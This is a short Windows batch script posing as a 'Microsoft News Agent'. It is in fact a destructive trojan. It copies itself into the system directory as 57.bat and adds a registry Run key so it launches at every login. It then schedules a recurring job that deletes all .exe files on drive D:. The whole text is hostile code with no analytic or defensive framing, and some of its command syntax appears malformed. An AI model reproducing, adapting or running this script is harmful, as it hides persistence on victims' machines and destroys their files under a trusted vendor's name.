@echo off
copy microsoft_news_agent.bat %systemroot%\57.bat
reg add "hkcu\software\microsoft\windows\currentversion\run" /v Microsoft News Agent /t reg_sz /d "%systemroot%\57.bat"
at / every:4,8,15,16,23,30 cmd /c if exist D:\*.exe del D:\*.exe